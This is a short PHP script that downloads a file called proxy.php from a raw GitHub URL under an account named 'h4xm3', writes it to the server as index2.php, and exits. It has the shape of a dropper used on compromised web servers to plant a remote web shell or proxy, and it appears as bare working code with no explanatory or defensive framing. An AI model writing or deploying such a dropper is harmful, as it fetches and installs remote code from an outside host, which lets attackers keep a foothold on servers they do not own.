<?php
$fp = fopen('index2.php', 'w');
fwrite($fp, file_get_contents('https://raw.githubusercontent.com/h4xm3/145662/master/proxy.php'));
fclose($fp);
exit();
?>
